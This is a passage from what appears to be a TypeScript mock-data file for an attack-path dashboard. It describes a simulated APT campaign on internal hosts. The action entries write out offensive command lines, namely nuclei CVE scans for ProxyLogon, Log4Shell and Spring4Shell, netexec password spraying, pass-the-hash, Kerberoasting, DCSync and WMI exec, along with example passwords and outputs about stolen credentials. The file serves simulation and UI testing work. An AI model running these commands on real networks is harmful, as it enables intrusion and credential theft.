    { node_id:'n3-ep33', node_type:'ASSET', node_label:'CORP-SPARE-33', node_hostname:'CORP-SPARE-33', node_ip:'10.99.0.3', node_platform:'Windows 10', node_status:'pending', node_zone:'Reserve', node_subnet:'10.99.0.0/16', node_untouched:true, node_agents:['sentinel_one'], },
    { node_id:'n3-ep34', node_type:'ASSET', node_label:'CORP-SPARE-34', node_hostname:'CORP-SPARE-34', node_ip:'10.99.0.4', node_platform:'Windows 10', node_status:'pending', node_zone:'Reserve', node_subnet:'10.99.0.0/16', node_untouched:true, node_agents:['palo_alto'], },
    { node_id:'n3-ep35', node_type:'ASSET', node_label:'CORP-SPARE-35', node_hostname:'CORP-SPARE-35', node_ip:'10.99.0.5', node_platform:'Windows 10', node_status:'pending', node_zone:'Reserve', node_subnet:'10.99.0.0/16', node_untouched:true, node_agents:['palo_alto'], },
    { node_id:'n3-ep36', node_type:'ASSET', node_label:'CORP-SPARE-36', node_hostname:'CORP-SPARE-36', node_ip:'10.99.0.6', node_platform:'Windows 10', node_status:'pending', node_zone:'Reserve', node_subnet:'10.99.0.0/16', node_untouched:true, node_agents:['palo_alto'], },
    { node_id:'n3-ep37', node_type:'ASSET', node_label:'CORP-SPARE-37', node_hostname:'CORP-SPARE-37', node_ip:'10.99.0.7', node_platform:'Windows 10', node_status:'pending', node_zone:'Reserve', node_subnet:'10.99.0.0/16', node_untouched:true, node_agents:['sentinel_one'], },
    { node_id:'n3-ep38', node_type:'ASSET', node_label:'CORP-SPARE-38', node_hostname:'CORP-SPARE-38', node_ip:'10.99.0.8', node_platform:'Windows 10', node_status:'pending', node_zone:'Reserve', node_subnet:'10.99.0.0/16', node_untouched:true, node_agents:['sentinel_one'], },
    { node_id:'n3-ep39', node_type:'ASSET', node_label:'CORP-SPARE-39', node_hostname:'CORP-SPARE-39', node_ip:'10.99.0.9', node_platform:'Windows 10', node_status:'pending', node_zone:'Reserve', node_subnet:'10.99.0.0/16', node_untouched:true, node_agents:['sentinel_one', 'openaev'], },
    { node_id:'n3-ep40', node_type:'ASSET', node_label:'CORP-SPARE-40', node_hostname:'CORP-SPARE-40', node_ip:'10.99.0.10', node_platform:'Windows 10', node_status:'pending', node_zone:'Reserve', node_subnet:'10.99.0.0/16', node_untouched:true, node_agents:['palo_alto'], },
    { node_id:'n3-ep41', node_type:'ASSET', node_label:'CORP-SPARE-41', node_hostname:'CORP-SPARE-41', node_ip:'10.99.0.11', node_platform:'Windows 10', node_status:'pending', node_zone:'Reserve', node_subnet:'10.99.0.0/16', node_untouched:true, node_agents:['sentinel_one'], },
    { node_id:'n3-ep42', node_type:'ASSET', node_label:'CORP-SPARE-42', node_hostname:'CORP-SPARE-42', node_ip:'10.99.0.12', node_platform:'Windows 10', node_status:'pending', node_zone:'Reserve', node_subnet:'10.99.0.0/16', node_untouched:true, node_agents:['sentinel_one'], },
    { node_id:'n3-ep43', node_type:'ASSET', node_label:'CORP-SPARE-43', node_hostname:'CORP-SPARE-43', node_ip:'10.99.0.13', node_platform:'Windows 10', node_status:'pending', node_zone:'Reserve', node_subnet:'10.99.0.0/16', node_untouched:true, node_agents:['palo_alto'], },
    { node_id:'n3-ep44', node_type:'ASSET', node_label:'CORP-SPARE-44', node_hostname:'CORP-SPARE-44', node_ip:'10.99.0.14', node_platform:'Windows 10', node_status:'pending', node_zone:'Reserve', node_subnet:'10.99.0.0/16', node_untouched:true, node_agents:['sentinel_one', 'openaev'], },
    { node_id:'n3-ep45', node_type:'ASSET', node_label:'CORP-SPARE-45', node_hostname:'CORP-SPARE-45', node_ip:'10.99.0.15', node_platform:'Windows 10', node_status:'pending', node_zone:'Reserve', node_subnet:'10.99.0.0/16', node_untouched:true, node_agents:['palo_alto'], },
    { node_id:'n3-ep46', node_type:'ASSET', node_label:'CORP-SPARE-46', node_hostname:'CORP-SPARE-46', node_ip:'10.99.0.16', node_platform:'Windows 10', node_status:'pending', node_zone:'Reserve', node_subnet:'10.99.0.0/16', node_untouched:true, node_agents:['openaev'], },
    { node_id:'n3-ep47', node_type:'ASSET', node_label:'CORP-SPARE-47', node_hostname:'CORP-SPARE-47', node_ip:'10.99.1.1', node_platform:'Windows 10', node_status:'pending', node_zone:'Reserve', node_subnet:'10.99.0.0/16', node_untouched:true, node_agents:['palo_alto'], },
    { node_id:'n3-ep48', node_type:'ASSET', node_label:'CORP-SPARE-48', node_hostname:'CORP-SPARE-48', node_ip:'10.99.1.2', node_platform:'Windows 10', node_status:'pending', node_zone:'Reserve', node_subnet:'10.99.0.0/16', node_untouched:true, node_agents:['sentinel_one'], },
    { node_id:'n3-ep49', node_type:'ASSET', node_label:'CORP-SPARE-49', node_hostname:'CORP-SPARE-49', node_ip:'10.99.1.3', node_platform:'Windows 10', node_status:'pending', node_zone:'Reserve', node_subnet:'10.99.0.0/16', node_untouched:true, node_agents:['palo_alto'], },
    { node_id:'n3-ep50', node_type:'ASSET', node_label:'CORP-SPARE-50', node_hostname:'CORP-SPARE-50', node_ip:'10.99.1.4', node_platform:'Windows 10', node_status:'pending', node_zone:'Reserve', node_subnet:'10.99.0.0/16', node_untouched:true, node_agents:['sentinel_one'], },
    { node_id:'n3-ep51', node_type:'ASSET', node_label:'CORP-SPARE-51', node_hostname:'CORP-SPARE-51', node_ip:'10.99.1.5', node_platform:'Windows 10', node_status:'pending', node_zone:'Reserve', node_subnet:'10.99.0.0/16', node_untouched:true, node_agents:['sentinel_one', 'openaev'], },
    { node_id:'n3-ep52', node_type:'ASSET', node_label:'CORP-SPARE-52', node_hostname:'CORP-SPARE-52', node_ip:'10.99.1.6', node_platform:'Windows 10', node_status:'pending', node_zone:'Reserve', node_subnet:'10.99.0.0/16', node_untouched:true, node_agents:['openaev'], },
    { node_id:'n3-ep53', node_type:'ASSET', node_label:'CORP-SPARE-53', node_hostname:'CORP-SPARE-53', node_ip:'10.99.1.7', node_platform:'Windows 10', node_status:'pending', node_zone:'Reserve', node_subnet:'10.99.0.0/16', node_untouched:true, node_agents:['sentinel_one', 'openaev'], },
    { node_id:'n3-ep54', node_type:'ASSET', node_label:'CORP-SPARE-54', node_hostname:'CORP-SPARE-54', node_ip:'10.99.1.8', node_platform:'Windows 10', node_status:'pending', node_zone:'Reserve', node_subnet:'10.99.0.0/16', node_untouched:true, node_agents:['sentinel_one'], },
    { node_id:'n3-ep55', node_type:'ASSET', node_label:'CORP-SPARE-55', node_hostname:'CORP-SPARE-55', node_ip:'10.99.1.9', node_platform:'Windows 10', node_status:'pending', node_zone:'Reserve', node_subnet:'10.99.0.0/16', node_untouched:true, node_agents:['sentinel_one'], },
    { node_id:'n3-ep56', node_type:'ASSET', node_label:'CORP-SPARE-56', node_hostname:'CORP-SPARE-56', node_ip:'10.99.1.10', node_platform:'Windows 10', node_status:'pending', node_zone:'Reserve', node_subnet:'10.99.0.0/16', node_untouched:true, node_agents:['palo_alto'], },
    { node_id:'n3-ep57', node_type:'ASSET', node_label:'CORP-SPARE-57', node_hostname:'CORP-SPARE-57', node_ip:'10.99.1.11', node_platform:'Windows 10', node_status:'pending', node_zone:'Reserve', node_subnet:'10.99.0.0/16', node_untouched:true, node_agents:['sentinel_one'], },
    { node_id:'n3-ep58', node_type:'ASSET', node_label:'CORP-SPARE-58', node_hostname:'CORP-SPARE-58', node_ip:'10.99.1.12', node_platform:'Windows 10', node_status:'pending', node_zone:'Reserve', node_subnet:'10.99.0.0/16', node_untouched:true, node_agents:['palo_alto'], },
    { node_id:'n3-ep59', node_type:'ASSET', node_label:'CORP-SPARE-59', node_hostname:'CORP-SPARE-59', node_ip:'10.99.1.13', node_platform:'Windows 10', node_status:'pending', node_zone:'Reserve', node_subnet:'10.99.0.0/16', node_untouched:true, node_agents:['sentinel_one', 'openaev'], },
    { node_id:'n3-ep60', node_type:'ASSET', node_label:'CORP-SPARE-60', node_hostname:'CORP-SPARE-60', node_ip:'10.99.1.14', node_platform:'Windows 10', node_status:'pending', node_zone:'Reserve', node_subnet:'10.99.0.0/16', node_untouched:true, node_agents:['sentinel_one'], },
    { node_id:'n3-act01', node_type:'ACTION', node_label:'nmap – TCP SYN Scan — 10.40.0.10',
      node_status:'undetected', node_payload_name:'nmap – TCP SYN Scan',
      node_command:'nmap', node_arguments:'-sS -sV -p 80,443,8080',
      node_executed_at:'2026-06-03T06:12:00Z', node_agent:'openaev', node_ip:'10.40.0.10',
      node_expectations:[{expectation_id:'n3-e01',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`Nmap: 80/tcp nginx, 443/tcp ssl, 8080/tcp Apache Tomcat discovered on CORP-WEB-01`,
      node_ports_found:['22/tcp open ssh OpenSSH 7.9p1', '80/tcp open http Apache 2.4.38', '443/tcp open ssl/https Apache 2.4.38', '8443/tcp open https-alt Grafana 8.5'] },
    { node_id:'n3-act02', node_type:'ACTION', node_label:'nuclei – CVE-2021-22205 — 10.40.0.20',
      node_status:'undetected', node_payload_name:'nuclei – CVE-2021-22205',
      node_command:'nuclei', node_arguments:'-u http://10.40.0.20:8080 -t cves/2021/CVE-2021-22205.yaml',
      node_executed_at:'2026-06-03T06:24:00Z', node_agent:'sentinel_one', node_ip:'10.40.0.20',
      node_expectations:[{expectation_id:'n3-e02',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`[CVE-2021-22205] [critical] GitLab RCE on CORP-DMZ-01 → uid=git, initial foothold`,
      node_cves_found:['CVE-2021-22205 (GitLab RCE via ExifTool) - CRITICAL'] },
    { node_id:'n3-act03', node_type:'ACTION', node_label:'netexec – SMB credential spray — 10.40.1.10',
      node_status:'undetected', node_payload_name:'netexec – SMB credential spray',
      node_command:'netexec', node_arguments:'smb 10.40.1.10 -u svc_app -p AppSvc2024!',
      node_executed_at:'2026-06-03T06:36:00Z', node_agent:'openaev', node_ip:'10.40.1.10',
      node_expectations:[{expectation_id:'n3-e03',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`SMB [+] CORP\\svc_app:AppSvc2024! (Pwn3d!) credentials in web.config extracted` },
    { node_id:'n3-act04', node_type:'ACTION', node_label:'nuclei – CVE-2022-26134 — 10.40.1.20',
      node_status:'undetected', node_payload_name:'nuclei – CVE-2022-26134',
      node_command:'nuclei', node_arguments:'-u http://10.40.1.20:8090 -t cves/2022/CVE-2022-26134.yaml',
      node_executed_at:'2026-06-03T06:48:00Z', node_agent:'sentinel_one', node_ip:'10.40.1.20',
      node_expectations:[{expectation_id:'n3-e04',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`[CVE-2022-26134] Confluence RCE → admin creds in confluence.cfg`,
      node_cves_found:['CVE-2022-26134 (Confluence Server OGNL Injection RCE) - CRITICAL'] },
    { node_id:'n3-act06', node_type:'ACTION', node_label:'nuclei – CVE-2021-26855 — 10.40.2.10',
      node_status:'undetected', node_payload_name:'nuclei – CVE-2021-26855',
      node_command:'nuclei', node_arguments:'-u https://10.40.2.10 -t cves/2021/CVE-2021-26855.yaml',
      node_executed_at:'2026-06-03T07:00:00Z', node_agent:'sentinel_one', node_ip:'10.40.2.10',
      node_expectations:[{expectation_id:'n3-e06',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`[CVE-2021-26855] [critical] Exchange ProxyLogon → SYSTEM on CORP-EXCH-01`,
      node_cves_found:['CVE-2021-26855 (Exchange Server SSRF ProxyLogon) - CRITICAL', 'CVE-2021-27065 (Exchange Server Arbitrary File Write) - CRITICAL'] },
    { node_id:'n3-act07', node_type:'ACTION', node_label:'netexec – MSSQL enum — 10.40.1.30',
      node_status:'detected', node_payload_name:'netexec – MSSQL enum',
      node_command:'netexec', node_arguments:'mssql 10.40.1.30 -u sa -p Sql@dm1n2024',
      node_executed_at:'2026-06-03T07:12:00Z', node_agent:'openaev', node_ip:'10.40.1.30',
      node_expectations:[{expectation_id:'n3-e07',expectation_type:'DETECTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
      node_terminal_output:`MSSQL DETECTED: SQL injection attempt logged. [+] 8 databases accessed` },
    { node_id:'n3-act10', node_type:'ACTION', node_label:'nmap – TCP SYN Scan — 10.40.3.12',
      node_status:'undetected', node_payload_name:'nmap – TCP SYN Scan',
      node_command:'nmap', node_arguments:'-sS -p 445,3389,5985',
      node_executed_at:'2026-06-03T07:24:00Z', node_agent:'openaev', node_ip:'10.40.3.12',
      node_expectations:[{expectation_id:'n3-e10',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`Nmap: 445/tcp smb, 3389/tcp rdp, 5985/tcp winrm. All open on CORP-WS-03`,
      node_ports_found:['135/tcp open msrpc Microsoft Windows RPC', '139/tcp open netbios-ssn', '445/tcp open microsoft-ds', '3389/tcp open ms-wbt-server RDP', '5985/tcp open http WinRM 2.0'] },
    { node_id:'n3-act11', node_type:'ACTION', node_label:'netexec – SMB pass-the-hash — 10.40.4.10',
      node_status:'undetected', node_payload_name:'netexec – SMB pass-the-hash',
      node_command:'netexec', node_arguments:'smb 10.40.4.10 -u Administrator -H $NTHASH',
      node_executed_at:'2026-06-03T07:36:00Z', node_agent:'sentinel_one', node_ip:'10.40.4.10',
      node_expectations:[{expectation_id:'n3-e11',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`SMB [+] PTH successful on FIN-WS-01. 3 credentials extracted via LSASS dump` },
    { node_id:'n3-act13', node_type:'ACTION', node_label:'nuclei – CVE-2021-44228 — 10.40.4.20',
      node_status:'undetected', node_payload_name:'nuclei – CVE-2021-44228',
      node_command:'nuclei', node_arguments:'-u http://10.40.4.20:8080 -t cves/2021/CVE-2021-44228.yaml',
      node_executed_at:'2026-06-03T07:48:00Z', node_agent:'sentinel_one', node_ip:'10.40.4.20',
      node_expectations:[{expectation_id:'n3-e13',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`[CVE-2021-44228] Log4Shell → RCE on FIN-DB-01, uid=db_admin. DB dump initiated`,
      node_cves_found:['CVE-2021-44228 (Apache Log4j2 JNDI RCE) - CRITICAL', 'CVE-2021-45046 (Log4j2 RCE DoS) - CRITICAL'] },
    { node_id:'n3-act15', node_type:'ACTION', node_label:'netexec – SMB shares — 10.40.4.30',
      node_status:'undetected', node_payload_name:'netexec – SMB shares',
      node_command:'netexec', node_arguments:'smb 10.40.4.30 -u svc_db -p DbConn2024! --shares',
      node_executed_at:'2026-06-03T08:00:00Z', node_agent:'openaev', node_ip:'10.40.4.30',
      node_expectations:[{expectation_id:'n3-e15',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`SMB [+] Finance shares. HR contracts downloaded (128 MB). C$ accessible` },
    { node_id:'n3-act16', node_type:'ACTION', node_label:'nmap – TCP SYN Scan — 10.40.5.10',
      node_status:'undetected', node_payload_name:'nmap – TCP SYN Scan',
      node_command:'nmap', node_arguments:'-sS -p 135,445,3389',
      node_executed_at:'2026-06-03T08:12:00Z', node_agent:'openaev', node_ip:'10.40.5.10',
      node_expectations:[{expectation_id:'n3-e16',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`Nmap: 135/tcp msrpc, 445/tcp smb, 3389/tcp rdp open on HR-WS-01`,
      node_ports_found:['22/tcp open ssh OpenSSH 8.2p1', '3306/tcp open mysql MySQL 8.0.28', '6379/tcp open redis Redis 6.2.7'] },
    { node_id:'n3-act18', node_type:'ACTION', node_label:'netexec – LDAP Kerberoasting — 10.40.5.20',
      node_status:'undetected', node_payload_name:'netexec – LDAP Kerberoasting',
      node_command:'netexec', node_arguments:'ldap 10.40.5.20 -u admin -p Admin2024 --kerberoasting',
      node_executed_at:'2026-06-03T08:24:00Z', node_agent:'sentinel_one', node_ip:'10.40.5.20',
      node_expectations:[{expectation_id:'n3-e18',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`LDAP Kerberoasting: svc_hr $krbtgs$23$*... hash cracked → CORP\\svc_hr:HRService2024!`,
      node_users_found:['CORP\\Administrator', 'CORP\\svc_mssql', 'CORP\\svc_exchange', 'CORP\\jsmith', 'CORP\\acct.harris', 'CORP\\svc_backup', 'CORP\\fin.taylor'] },
    { node_id:'n3-act19', node_type:'ACTION', node_label:'netexec – WMI exec — 10.40.6.5',
      node_status:'undetected', node_payload_name:'netexec – WMI exec',
      node_command:'netexec', node_arguments:'wmi 10.40.6.5 -u Administrator -H $NTHASH -x "whoami"',
      node_executed_at:'2026-06-03T08:36:00Z', node_agent:'openaev', node_ip:'10.40.6.5',
      node_expectations:[{expectation_id:'n3-e19',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`WMI [+] IT-MGMT-01 NT AUTHORITY\\SYSTEM via PTH. Scheduled task persistence created` },
    { node_id:'n3-act21', node_type:'ACTION', node_label:'nmap – TCP SYN Scan — 10.40.7.10',
      node_status:'undetected', node_payload_name:'nmap – TCP SYN Scan',
      node_command:'nmap', node_arguments:'-sS -p 445,3389,5985',
      node_executed_at:'2026-06-03T08:48:00Z', node_agent:'openaev', node_ip:'10.40.7.10',
      node_expectations:[{expectation_id:'n3-e21',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`Nmap: 445/tcp smb, 3389/tcp rdp, 5985/tcp winrm on OPS-WS-01`,
      node_ports_found:['80/tcp open http Apache Tomcat 10.1.7', '443/tcp open ssl/https Apache 2.4.54', '8009/tcp open ajp13 Apache Jserv 1.3'] },
    { node_id:'n3-act23', node_type:'ACTION', node_label:'nuclei – CVE-2022-22965 — 10.40.7.20',
      node_status:'undetected', node_payload_name:'nuclei – CVE-2022-22965',
      node_command:'nuclei', node_arguments:'-u http://10.40.7.20 -t cves/2022/CVE-2022-22965.yaml',
      node_executed_at:'2026-06-03T09:00:00Z', node_agent:'sentinel_one', node_ip:'10.40.7.20',
      node_expectations:[{expectation_id:'n3-e23',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`[CVE-2022-22965] Spring4Shell → RCE on OPS-DB-01. web shell at /cmd.jsp`,
      node_cves_found:['CVE-2022-22965 (Spring4Shell RCE via ClassLoader) - CRITICAL'] },
    { node_id:'n3-act24', node_type:'ACTION', node_label:'netexec – RDP login — 10.40.8.10',
      node_status:'undetected', node_payload_name:'netexec – RDP login',
      node_command:'netexec', node_arguments:'rdp 10.40.8.10 -u EXEC\\admin -p Exec@2024',
      node_executed_at:'2026-06-03T09:12:00Z', node_agent:'sentinel_one', node_ip:'10.40.8.10',
      node_expectations:[{expectation_id:'n3-e24',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`RDP [+] EXEC\\admin:Exec@2024 (Pwn3d!) on EXEC-WS-01. Keylogger deployed` },
    { node_id:'n3-act26', node_type:'ACTION', node_label:'nuclei – CVE-2023-44487 — 10.40.9.10',
      node_status:'undetected', node_payload_name:'nuclei – CVE-2023-44487',
      node_command:'nuclei', node_arguments:'-u https://10.40.9.10 -t cves/2023/CVE-2023-44487.yaml',
      node_executed_at:'2026-06-03T09:24:00Z', node_agent:'sentinel_one', node_ip:'10.40.9.10',
      node_expectations:[{expectation_id:'n3-e26',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`[CVE-2023-44487] HTTP/2 Rapid Reset on BACKUP-SRV-01. SSH key found`,
      node_cves_found:['CVE-2023-44487 (HTTP/2 Rapid Reset DoS) - HIGH', 'CVE-2023-46604 (Apache ActiveMQ RCE) - CRITICAL'] },
    { node_id:'n3-act28', node_type:'ACTION', node_label:'netexec – LDAP DCSync — 10.40.2.6',
      node_status:'undetected', node_payload_name:'netexec – LDAP DCSync',
      node_command:'netexec', node_arguments:'ldap 10.40.2.6 -u Administrator -p Dom@in2024 --ntds',
      node_executed_at:'2026-06-03T09:36:00Z', node_agent:'openaev', node_ip:'10.40.2.6',
      node_expectations:[{expectation_id:'n3-e28',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`LDAP DCSync → NTDS.dit extracted (891 accounts + all service account hashes)`,
      node_users_found:['CORP\\Administrator', 'CORP\\krbtgt', 'CORP\\svc_backup', 'CORP\\svc_mssql', 'CORP\\svc_exchange', 'CORP\\svc_deploy', 'CORP\\mgmt.admin', 'CORP\\cto.chen'] },
    { node_id:'n3-act29', node_type:'ACTION', node_label:'nuclei – CVE-2021-21985 — 10.40.10.5',
      node_status:'undetected', node_payload_name:'nuclei – CVE-2021-21985',
      node_command:'nuclei', node_arguments:'-u https://10.40.10.5 -t cves/2021/CVE-2021-21985.yaml',
      node_executed_at:'2026-06-03T09:48:00Z', node_agent:'sentinel_one', node_ip:'10.40.10.5',
      node_expectations:[{expectation_id:'n3-e29',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`[CVE-2021-21985] VMware vCenter RCE → VSPHERE.LOCAL admin. 147 VMs enumerated`,
      node_cves_found:['CVE-2021-21985 (VMware vCenter Server RCE) - CRITICAL', 'CVE-2021-22005 (vCenter File Upload RCE) - CRITICAL'] },
    { node_id:'n3-act30', node_type:'ACTION', node_label:'netexec – WMI exec — 10.40.10.10',
      node_status:'undetected', node_payload_name:'netexec – WMI exec',
      node_command:'netexec', node_arguments:'wmi 10.40.10.10 -u Administrator -H $HASH -x "net group /domain"',
      node_executed_at:'2026-06-03T10:00:00Z', node_agent:'sentinel_one', node_ip:'10.40.10.10',
      node_expectations:[{expectation_id:'n3-e30',expectation_type:'DETECTION',expectation_status:'FAILED',expectation_score:0,expectation_expected_score:100}],
      node_terminal_output:`WMI [+] FINAL-DC-01 NT AUTHORITY\\SYSTEM. Objective complete — forest-wide compromise` },
  ],
  attack_path_edges: [
    { edge_id:'n3-al-01', edge_type:'asset_link', edge_source:'n3-act01', edge_target:'n3-ep01' },
    { edge_id:'n3-al-02', edge_type:'asset_link', edge_source:'n3-act02', edge_target:'n3-ep02' },
    { edge_id:'n3-al-03', edge_type:'asset_link', edge_source:'n3-act03', edge_target:'n3-ep03' },
    { edge_id:'n3-al-04', edge_type:'asset_link', edge_source:'n3-act04', edge_target:'n3-ep04' },
    { edge_id:'n3-al-06', edge_type:'asset_link', edge_source:'n3-act06', edge_target:'n3-ep06' },
    { edge_id:'n3-al-07', edge_type:'asset_link', edge_source:'n3-act07', edge_target:'n3-ep07' },
    { edge_id:'n3-al-10', edge_type:'asset_link', edge_source:'n3-act10', edge_target:'n3-ep10' },
    { edge_id:'n3-al-11', edge_type:'asset_link', edge_source:'n3-act11', edge_target:'n3-ep11' },
    { edge_id:'n3-al-13', edge_type:'asset_link', edge_source:'n3-act13', edge_target:'n3-ep13' },
    { edge_id:'n3-al-15', edge_type:'asset_link', edge_source:'n3-act15', edge_target:'n3-ep15' },
    { edge_id:'n3-al-16', edge_type:'asset_link', edge_source:'n3-act16', edge_target:'n3-ep16' },
    { edge_id:'n3-al-18', edge_type:'asset_link', edge_source:'n3-act18', edge_target:'n3-ep18' },
    { edge_id:'n3-al-19', edge_type:'asset_link', edge_source:'n3-act19', edge_target:'n3-ep19' },
    { edge_id:'n3-al-21', edge_type:'asset_link', edge_source:'n3-act21', edge_target:'n3-ep21' },
    { edge_id:'n3-al-23', edge_type:'asset_link', edge_source:'n3-act23', edge_target:'n3-ep23' },
    { edge_id:'n3-al-24', edge_type:'asset_link', edge_source:'n3-act24', edge_target:'n3-ep24' },
    { edge_id:'n3-al-26', edge_type:'asset_link', edge_source:'n3-act26', edge_target:'n3-ep26' },
    { edge_id:'n3-al-28', edge_type:'asset_link', edge_source:'n3-act28', edge_target:'n3-ep28' },
    { edge_id:'n3-al-29', edge_type:'asset_link', edge_source:'n3-act29', edge_target:'n3-ep29' },
    { edge_id:'n3-al-30', edge_type:'asset_link', edge_source:'n3-act30', edge_target:'n3-ep30' },
    { edge_id:'n3-pivot-01-02', edge_type:'pivot', edge_source:'n3-ep01', edge_target:'n3-ep02', edge_label:'Spearphishing web shell → DMZ network pivot' },
    { edge_id:'n3-pivot-03-05', edge_type:'pivot', edge_source:'n3-ep03', edge_target:'n3-ep05', edge_label:'LSASS credential dump on APP-01 → DCSync on DC-01' },
    { edge_id:'n3-pivot-05-08', edge_type:'pivot', edge_source:'n3-ep05', edge_target:'n3-ep08', edge_label:'Golden Ticket attack → CORP-WS-01 lateral movement' },
    { edge_id:'n3-pivot-08-11', edge_type:'pivot', edge_source:'n3-ep08', edge_target:'n3-ep11', edge_label:'Pass-the-Hash via mimikatz from CORP-WS-01 → FIN-WS-01' },
    { edge_id:'n3-pivot-11-12', edge_type:'pivot', edge_source:'n3-ep11', edge_target:'n3-ep12', edge_label:'FIN-WS-01 cached credential reuse → FIN-WS-02' },
    { edge_id:'n3-pivot-12-14', edge_type:'pivot', edge_source:'n3-ep12', edge_target:'n3-ep14', edge_label:'Kerberoasting + privilege escalation → FIN-DC-01' },
    { edge_id:'n3-pivot-14-20', edge_type:'pivot', edge_source:'n3-ep14', edge_target:'n3-ep20', edge_label:'FIN-DC-01 admin share access → IT-JUMP-01' },
    { edge_id:'n3-pivot-19-25', edge_type:'pivot', edge_source:'n3-ep19', edge_target:'n3-ep25', edge_label:'IT-MGMT-01 service account creds → EXEC-WS-02' },
    { edge_id:'n3-pivot-25-27', edge_type:'pivot', edge_source:'n3-ep25', edge_target:'n3-ep27', edge_label:'Executive data exfiltration path → BACKUP-SRV-02' },
    { edge_id:'n3-pivot-28-30', edge_type:'pivot', edge_source:'n3-ep28', edge_target:'n3-ep30', edge_label:'Inter-domain forest trust exploitation → FINAL-DC-01' },
  ],
  attack_path_stats: {
    stats_prevented:0, stats_detected:2, stats_undetected:18,
    stats_pending:30, stats_total_actions:20, stats_executed_actions:20,
    stats_captured_endpoints:30, stats_captured_files:22, stats_captured_credentials:31,
 stats_captured_users: 22,
 stats_captured_cves: 14,
  },
  attack_path_definitions: [
    { path_id:'n3-p1', path_name:'APT Lateral Movement Campaign', path_color:'#9c27b0',
      node_ids:['n3-ep01','n3-ep02','n3-ep03','n3-ep04','n3-ep05','n3-ep06','n3-ep07','n3-ep08','n3-ep09','n3-ep10','n3-ep11','n3-ep12','n3-ep13','n3-ep14','n3-ep15','n3-ep16','n3-ep17','n3-ep18','n3-ep19','n3-ep20','n3-ep21','n3-ep22','n3-ep23','n3-ep24','n3-ep25','n3-ep26','n3-ep27','n3-ep28','n3-ep29','n3-ep30'], path_outcome:'success',
      path_segment_reasons:{
        'n3-ep01->n3-ep02':'Web shell to DMZ pivot',
        'n3-ep02->n3-ep03':'Credential spray from DMZ',
        'n3-ep03->n3-ep05':'LSASS dump + DCSync (Pivot)',
        'n3-ep05->n3-ep08':'Golden Ticket lateral (Pivot)',
        'n3-ep08->n3-ep11':'Pass-the-Hash via mimikatz (Pivot)',
        'n3-ep11->n3-ep12':'Cached credential reuse (Pivot)',
        'n3-ep12->n3-ep14':'Kerberoasting → DC access (Pivot)',
        'n3-ep14->n3-ep20':'Admin share lateral movement (Pivot)',
        'n3-ep19->n3-ep25':'MGMT service account → Exec (Pivot)',
        'n3-ep25->n3-ep27':'Exec data to backup server (Pivot)',
        'n3-ep28->n3-ep30':'Inter-domain forest trust (Pivot)',
      },
    },
  ],
};

// ══════════════════════════════════════════════════════════════════════════════
// NEW SCENARIO E — Full Vulnerability Sweep (30 eps, all used, all nmap/nuclei, 0 pivots)
// Real-world: Red team performs comprehensive vulnerability assessment + exploitation
// across entire enterprise. Every system scanned via nmap/nuclei — zero lateral movement.
// ══════════════════════════════════════════════════════════════════════════════
export const MOCK_SCENARIO_NEW_30EP_INJONLY: AttackPathData = {
  attack_path_nodes: [
    { node_id:'n4-ep01', node_type:'ASSET', node_label:'PROD-WEB-01', node_hostname:'PROD-WEB-01', node_ip:'10.50.0.10', node_platform:'Ubuntu 22.04 LTS', node_status:'undetected', node_zone:'DMZ', node_subnet:'10.50.0.0/24', node_is_entry_point:true, node_agents:['palo_alto', 'openaev'], },
    { node_id:'n4-ep02', node_type:'ASSET', node_label:'PROD-WEB-02', node_hostname:'PROD-WEB-02', node_ip:'10.50.0.11', node_platform:'Ubuntu 22.04 LTS', node_status:'undetected', node_zone:'DMZ', node_subnet:'10.50.0.0/24', node_agents:['openaev'], },
    { node_id:'n4-ep03', node_type:'ASSET', node_label:'PROD-WEB-03', node_hostname:'PROD-WEB-03', node_ip:'10.50.0.12', node_platform:'CentOS 7', node_status:'undetected', node_zone:'DMZ', node_subnet:'10.50.0.0/24', node_agents:['palo_alto'], },
    { node_id:'n4-ep04', node_type:'ASSET', node_label:'STG-WEB-01', node_hostname:'STG-WEB-01', node_ip:'10.50.0.20', node_platform:'Ubuntu 20.04 LTS', node_status:'undetected', node_zone:'Staging', node_subnet:'10.50.0.0/24', node_agents:['sentinel_one'], },
    { node_id:'n4-ep05', node_type:'ASSET', node_label:'STG-WEB-02', node_hostname:'STG-WEB-02', node_ip:'10.50.0.21', node_platform:'Red Hat 8', node_status:'detected', node_zone:'Staging', node_subnet:'10.50.0.0/24', node_agents:['sentinel_one', 'openaev'], },
